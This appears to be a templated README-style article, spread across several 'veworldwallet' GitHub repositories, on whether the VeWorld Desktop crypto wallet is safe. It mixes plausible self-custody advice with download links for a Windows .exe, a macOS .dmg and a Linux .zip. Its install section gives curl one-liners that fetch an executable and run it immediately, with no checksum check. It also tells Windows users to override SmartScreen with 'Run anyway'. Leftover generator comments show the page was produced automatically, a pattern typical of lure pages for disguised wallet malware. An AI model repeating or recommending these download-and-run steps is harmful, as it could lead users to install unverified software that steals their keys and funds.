![VeWorld Desktop](../assets/banner-article.png)

# Is VeWorld Wallet Safe? Self-Custody in VeWorld Desktop

Keys stay local; the phrase is the only route back

## Downloads - v2.2.4

<p align="center"><a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-win-v2.2.4.exe"><img src="../assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-macos-v2.2.4.dmg"><img src="../assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-linux-v2.2.4.zip"><img src="../assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="../assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`VeWorld-desktop-wallet-win-v2.2.4.exe`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-win-v2.2.4.exe) |
| <img src="../assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`VeWorld-desktop-wallet-macos-v2.2.4.dmg`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-macos-v2.2.4.dmg) |
| <img src="../assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`VeWorld-desktop-wallet-linux-v2.2.4.zip`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-linux-v2.2.4.zip) |

Download the [current VeWorld Desktop release](https://github.com/veworldwallet/veworld-desktop-wallet/releases/tag/v2.2.4) for Windows, macOS and Linux.

> VeWorld Desktop is actively maintained; run the current release before treating a display problem as a wallet fault.

VeWorld Desktop is as safe as the machine it runs on and the habits of the person using it. It keeps keys locally behind a password, never holds a server-side account, and lets a Ledger hold the keys instead, but it cannot protect a phrase that was photographed, typed into a website, or stored in a cloud note.

<!-- ARTICLE-BODY-BEGIN -->

## You'll see this if

You are about to move a balance into a desktop wallet and want to know what the risks actually are, or you have read conflicting claims about whether any wallet can be trusted with keys.

| Risk you are weighing | What the wallet does about it | What only you can do |
|---|---|---|
| Someone else reading your keys | Encrypts them locally behind a password | Choose a strong password; keep the phrase offline |
| A malicious website | Never asks for the phrase; signs only what you approve | Read what you sign; refuse phrase requests |
| A stolen laptop | Requires the password to open | Use disk encryption and a screen lock |
| A compromised download | Published releases with checksums | Download from the release page only |
| A dishonest dApp | Shows the request before signing | Disconnect sessions you do not need |

## Why it happens

The security model is custody, not insurance. A self-custody wallet holds the material that controls an address, encrypted with a key derived from your password, on your own storage. Nobody at the project can reverse a transaction, reset a password or restore access, because nobody at the project holds a copy. That is the point of the design, and it is also the reason the phrase matters more than any feature.

Most losses in this category do not come from broken cryptography. They come from recovery phrases typed into lookalike sites, from approvals signed without reading them, and from downloads taken from somewhere other than the published release. A wallet can make those mistakes harder by showing clear confirmation screens and warning about network mismatches, but it cannot make them impossible, because the final approval is a human decision.

Hardware changes the shape of the risk rather than removing it, and <a href="https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/pair-a-vechain-ledger-with-veworld-desktop.md">pairing a Ledger with VeWorld Desktop</a> is the step where that difference starts. With a Ledger paired over USB, the keys stay on the device, the address is derived from the device, and every signature is confirmed on the device's own screen. A compromised computer can propose a transaction but cannot sign one without that confirmation. What it can still do is show you a misleading request, so reading the device screen rather than the app window is the habit that matters.

Then there is the question of what can be claimed. This build does not publish an independent security audit, so no claim of one belongs in a discussion of its safety. What can be said plainly is narrower and more useful: keys are local, the wallet is actively maintained, the release page publishes the builds and their checksums, and the phrase is the only recovery route.

## Fix

1. Download the current release from the project's GitHub releases page and verify the published checksum before installing.
2. Create the wallet on a machine you control, with disk encryption and a screen lock enabled.
3. Write <a href="https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/forgot-vechain-wallet-password-in-veworld-desktop.md">your VeWorld Desktop recovery phrase</a> on paper at setup; never photograph it, never store it in a note app or a password manager's cloud sync.
4. Set a password that is long and unique to this wallet. It protects local storage; it is not recoverable.
5. Pair a Ledger if the balance justifies it, and confirm every signature on the device screen.
6. Before approving any dApp request, read the contract and the amount, then disconnect the session afterwards.

## If that did not work

If you suspect the phrase has been exposed, treat the address as compromised and move the balance to a newly created wallet immediately. A phrase cannot be revoked, and no setting in the app can invalidate it.

If a transaction you did not intend appears in the history, the cause is a signature that was approved, possibly by a dApp session left connected. Disconnect every session, then move the remaining balance to a fresh address rather than trying to reverse anything.

If the app will not open after an update, do not reinstall over the top in a hurry: an uninstall can remove local storage. Confirm you have the phrase before changing anything about the installation.

## Prevention

- Keep the phrase offline, never share it with anyone, and treat any request for it as an attack, whoever appears to be asking.
- Download only from the release page, and check the checksum each time.
- Use a Ledger for balances you would be upset to lose, and read the device screen.
- Disconnect dApp sessions when finished, and review connected sites periodically.
- Keep the app on the current release; security and display fixes ship with releases.

VeWorld Desktop is actively maintained, and the current release can be downloaded from the <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/tag/v2.2.4">VeWorld Desktop releases page</a>.

## FAQ

### Can the team recover my wallet if I lose the password?

No. The password unlocks local storage; it is not held anywhere else. The recovery phrase is the route back, which is why it is written down at setup.

### Is a desktop wallet safer than a browser extension?

They fail differently. An extension lives inside a browser profile and shares its exposure; a desktop app is a separate process with its own storage. Which is safer depends on how the machine is used.

### Does this wallet have a security audit?

None is published for this build, so no audit claim should be made about it either way. Judge it on the published release, the checksum and your own operational habits.

### What happens if my laptop is stolen?

The thief has encrypted local storage and needs the password to open the wallet. With a strong password and disk encryption, the practical risk is limited, but the phrase should still be considered exposed and the balance moved.

### Can a dApp drain my wallet without asking?

It cannot act without a signature. It can ask for something dangerous, which is why every request is shown before approval.

<!-- ARTICLE-BODY-END -->

## How to install VeWorld Desktop

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-win-v2.2.4.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-win-v2.2.4.exe">VeWorld-desktop-wallet-win-v2.2.4.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-macos-v2.2.4.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-macos-v2.2.4.dmg">VeWorld-desktop-wallet-macos-v2.2.4.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
<!-- BLOCKED: the Linux release asset is a .zip with no verified extraction or launch facts,
     so no command is generated. The verified manual steps are kept below. -->
Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-linux-v2.2.4.zip">VeWorld-desktop-wallet-linux-v2.2.4.zip</a>.
2. Unzip the archive.
3. Run the application inside it.
<!-- INSTALL-END -->

## Related guides

- [Spotting a fake wallet site before it costs you](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/fake-crypto-wallet-app-vs-veworld-desktop.md)
- [What VeWorld Desktop is and where it comes from](https://github.com/veworldwallet/veworld-desktop-fees/blob/main/how-to/what-is-veworld-desktop.md)
- [Whether a Ledger can still lose funds](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/vechain-ledger-wallet-losses-veworld-desktop.md)
- [What the in-app lock does](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/vechain-wallet-security-app-lock-veworld-desktop.md)